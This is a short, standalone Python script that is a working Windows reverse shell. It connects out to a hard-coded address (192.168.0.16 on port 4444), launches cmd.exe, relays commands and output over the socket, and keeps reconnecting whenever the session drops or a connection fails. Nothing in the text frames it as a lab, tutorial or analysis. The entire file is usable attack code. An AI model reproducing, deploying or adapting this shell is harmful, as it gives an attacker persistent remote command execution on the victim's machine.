import socket,subprocess,threading

def receive_data(s, p):
    try:
        while 1:
            data = s.recv(1024)
            if len(data) > 0:
                p.stdin.write(data)
                p.stdin.flush()
    except:
        pass

def send_data(s, p):
    try:
        while 1:
            s.send(p.stdout.read(1))
    except:
        pass


def launching_process(ip,port,s):
    p=subprocess.Popen(["cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
    receive_thread = threading.Thread(target=receive_data, args=[s, p])
    receive_thread.daemon = True
    receive_thread.start()

    send_thread = threading.Thread(target=send_data, args=[s, p])
    send_thread.daemon = True
    send_thread.start()

    p.wait()
    if send_thread.is_alive():
        send_thread.join(0)
    if receive_thread.is_alive():
        receive_thread.join(0)
    s.close()
    try_to_connect(ip,port)

def try_to_connect(ip,port):
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        s.connect((ip,port))
        launching_process(ip,port,s)
    except:
        try_to_connect(ip,port)

try_to_connect("192.168.0.16",4444)